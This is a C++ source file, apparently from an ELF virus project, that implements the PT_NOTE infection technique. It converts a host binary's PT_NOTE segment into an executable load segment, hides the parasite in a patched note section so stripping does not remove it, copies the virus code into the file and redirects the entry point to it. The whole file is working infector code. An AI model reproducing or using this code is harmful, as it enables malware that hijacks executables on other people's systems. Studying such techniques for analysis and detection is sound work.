#include "infector/pt_note_infect.hh"
#include <elf.h>
#include <algorithm>
#include "common/file_descriptor.hh"
#include "common/macros.hh"
#include "common/math.hh"
#include "common/patch_pattern.hh"
#include "common/redirect_elf_entry_point.hh"
#include "nostdlib/stdio.hh"
#include "nostdlib/string.hh"

namespace vt::infector {

namespace {
bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr, uint64_t virus_size,
               uint64_t virus_offset, Elf64_Off original_pt_note_file_offset,
               Elf64_Addr parasite_load_address) {
  auto sht_entry_count = ehdr.e_shnum;
  auto* section_entry = &shdr;

  for (size_t i = 0; i < sht_entry_count; ++i) {
    if (section_entry->sh_offset == original_pt_note_file_offset) {
      section_entry->sh_offset = virus_offset;
      section_entry->sh_size = virus_size;
      section_entry->sh_addr = parasite_load_address;
      section_entry->sh_type = SHT_PROGBITS;
      section_entry->sh_flags = SHF_EXECINSTR | SHF_ALLOC;
      section_entry->sh_addralign = 64;
      return true;
    }
    // Move to the next section entry
    ++section_entry;
  }
  // Failed to find the section header entry.
  return false;
}

void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
                size_t pt_note_to_be_infected_idx,
                Elf64_Xword pt_load_alignment,
                Elf64_Addr parasite_load_address) {
  auto* pt_note_to_be_infected = &phdr + pt_note_to_be_infected_idx;
  // trasforming pt_note to pt_load
  pt_note_to_be_infected->p_align = pt_load_alignment;
  pt_note_to_be_infected->p_vaddr = parasite_load_address;
  pt_note_to_be_infected->p_paddr = parasite_load_address;
  pt_note_to_be_infected->p_filesz = virus_size;
  pt_note_to_be_infected->p_memsz = virus_size;
  pt_note_to_be_infected->p_offset = virus_offset;
  pt_note_to_be_infected->p_type = PT_LOAD;
  pt_note_to_be_infected->p_flags = PF_R + PF_X;
}

void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr parasite_load_address,
                uint64_t virus_offset) {
  ehdr.e_entry = parasite_load_address;
}

}  // namespace

bool PtNoteInfect::analyze(std::span<const std::byte> host_mapping,
                           std::span<const std::byte> parasite_mapping) {
  host_size_ = host_mapping.size();
  parasite_size_ = parasite_mapping.size();
  const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.data());
  if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
      ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
    return false;
  }

  const auto& phdr =
      *reinterpret_cast<const Elf64_Phdr*>(&host_mapping[ehdr.e_phoff]);

  original_e_entry_ = ehdr.e_entry;

  // Find code segment
  const Elf64_Phdr* phdr_entry = &phdr;
  for (size_t i = 0; i < ehdr.e_phnum; ++i, ++phdr_entry) {
    if (phdr_entry->p_type == PT_LOAD) {
      // the parasite should have a loading address avoiding all other LOAD
      // segments.
      auto last_byte_of_segment = phdr_entry->p_vaddr + phdr_entry->p_memsz - 1;
      auto potential_virus_loading_addr = last_byte_of_segment + 1;
      parasite_load_address_ =
          std::max(parasite_load_address_,
                   common::round_up_to(potential_virus_loading_addr,
                                       phdr_entry->p_align));
      // copy alignment so later we can assign to PT_NOTE.
      pt_load_alignment_ = phdr_entry->p_align;
    } else if (phdr_entry->p_type == PT_NOTE) {
      // We found the last PT_NOTE section that can be infected, because
      // GNU_PROPERTY (for example on x86-64) might overlap with the first. On
      // aarch64, it doesn't have such problem.
      pt_note_to_be_infected_idx_ = i;
      original_pt_note_file_offset_ = phdr_entry->p_offset;
    }
    // Do not early break out because we must scan all LOAD segments to find the
    // highest vaddress.
  }

  // if in the rare case that host is some wierdo, that actually has data at the
  // end of the file after section header table, do not infect because it's
  // likely there are other issues preventing it from working. For example, the
  // binary distributed by bazel does this https://github.com/bazelbuild/bazel
  if (parasite_load_address_ <=
      host_mapping.size() - ehdr.e_shnum * ehdr.e_shentsize) {
    const char* msg;
    STR_LITERAL(msg, PAD2("gave up because there are bytes appended\n"));
    printf(msg);
    return false;
  }

  auto sht_entry_count = ehdr.e_shnum;
  auto shdr = reinterpret_cast<const Elf64_Shdr*>(&host_mapping[ehdr.e_shoff]);
  auto shstrtab_idx = ehdr.e_shstrndx;
  auto shstrtab = &host_mapping[(shdr + shstrtab_idx)->sh_offset];
  for (size_t i = 0; i < sht_entry_count; ++i) {
    auto cur_entry = shdr + i;
    if (cur_entry->sh_type == SHT_NOTE) {
      const auto* name =
          reinterpret_cast<const char*>(shstrtab + cur_entry->sh_name);
      if (name[6] == 'g' && name[7] == 'o') {
        // This is a go elf, which relies on the note section to work. We cannot
        // mutate it.
        const char* msg;
        STR_LITERAL(msg, "cannot infect elf compiled from golang\n");
        printf(msg);
        return false;
      }
    }
  }

  return true;
}

bool PtNoteInfect::inject(std::span<std::byte> host_mapping,
                          std::span<const std::byte> parasite_mapping) {
  const auto& ehdr =
      *reinterpret_cast<const Elf64_Ehdr*>(&host_mapping.front());

  const auto virus_size = parasite_mapping.size();

  // In order to make it work on PIEs, these two must be the same.
  const auto virus_offset = parasite_load_address_;
  {
    auto& mutable_phdr =
        *reinterpret_cast<Elf64_Phdr*>(&host_mapping[ehdr.e_phoff]);
    patch_phdr(mutable_phdr, virus_size, virus_offset,
               pt_note_to_be_infected_idx_, pt_load_alignment_,
               parasite_load_address_);
  }

  {
    // mutate a note section entry to cover our virus so it doesn't get
    // stripped.
    auto& mutable_shdr =
        *reinterpret_cast<Elf64_Shdr*>(&host_mapping[ehdr.e_shoff]);
    if (!patch_sht(ehdr, mutable_shdr, virus_size, virus_offset,
                   original_pt_note_file_offset_, parasite_load_address_)) {
      return false;
    }
  }

  {
    auto& mutable_ehdr = *reinterpret_cast<Elf64_Ehdr*>(&host_mapping.front());
    patch_ehdr(mutable_ehdr, parasite_load_address_, virus_offset);
  }

  // Inject the virus.
  vt::memcpy(&host_mapping[virus_offset], &parasite_mapping.front(),
             parasite_mapping.size());

  return common::redirect_elf_entry_point(
      ehdr.e_type, original_e_entry_, parasite_load_address_, virus_offset,
      parasite_mapping.size(), host_mapping);
}

size_t PtNoteInfect::injected_host_size() {
  // In order to make this work on PIEs, the virus file offset must equal to
  // vaddr. Therefore, the file size will be extended. Note that this is not
  // necessary for non-PIE but doing this makes both PIE and non-PIE handling
  // simple. The size effect is that the executable would be very big, if the
  // victim happens to use a custom linker script that points segments at a very
  // large starting vaddr.
  return parasite_load_address_ + parasite_size_;
}

}  // namespace vt::infector